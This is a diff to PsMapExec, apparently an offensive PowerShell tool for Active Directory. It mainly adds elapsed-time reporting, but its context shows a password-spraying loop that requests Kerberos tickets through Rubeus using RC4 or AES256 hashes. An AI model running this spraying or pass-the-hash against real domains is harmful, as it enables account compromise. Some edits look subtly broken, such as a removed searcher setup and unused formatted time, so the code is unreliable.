@@ -1,5 +1,6 @@
 Function PsMapExec{
 
+
 [CmdletBinding()]
 Param(
     [Parameter(Mandatory=$False, Position=0, ValueFromPipeline=$true)]
@@ -74,6 +75,8 @@ Param(
     [Parameter(Mandatory=$False, Position=23, ValueFromPipeline=$true)]
     [Switch]$EmptyPassword
 )
+
+$startTime = Get-Date
 
 ################################################################################################################
 ###################################### Banner and version information ##########################################
@@ -3387,10 +3390,7 @@ if ($EmptyPassword){
 foreach ($UserToSpray in $EnabledDomainUsers){
 		$Delay = Get-Random -Minimum 8 -Maximum 90
 		Start-Sleep -Milliseconds $Delay
-$directoryEntry = [ADSI]"LDAP://$domain"
-$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
-$domainObject = $searcher.FindOne()
-$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)    
+ 
 $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
 $searchResult = $searcher.FindOne()
         $badPwdCount = $searchResult.Properties["badPwdCount"][0]  
@@ -3403,7 +3403,7 @@ $searchResult = $searcher.FindOne()
     }
 }
 
-            if ($Hash -ne $null){
+            if ($Hash -ne ""){
             
             if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash /domain:$domain" | Out-String}
             if ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash /domain:$domain" | Out-String}
@@ -3766,9 +3766,19 @@ Parse-LogonPasswords
 RestoreTicket
 
 Write-Host ""
-Write-Host ""
 $Time = (Get-Date).ToString("HH:mm:ss")
-Write-Host "Script finished at $Time"
+Write-Host "Script Completed : $Time"
+$elapsedTime = (Get-Date) - $startTime
+
+# Format the elapsed time
+$elapsedHours = "{0:D2}" -f $elapsedTime.Hours
+$elapsedMinutes = "{0:D2}" -f $elapsedTime.Minutes
+$elapsedSeconds = "{0:D2}" -f $elapsedTime.Seconds
+$elapsedMilliseconds = "{0:D4}" -f $elapsedTime.Milliseconds
+
+# Display the formatted elapsed time
+$elapsedTimeFormatted = "$elapsedHours h:$elapsedMinutes m:$elapsedSeconds s:$elapsedMilliseconds mi"
+Write-Host "Elapsed Time     : $elapsedTime"
 Get-Variable | Remove-Variable -ErrorAction SilentlyContinue
 
 }
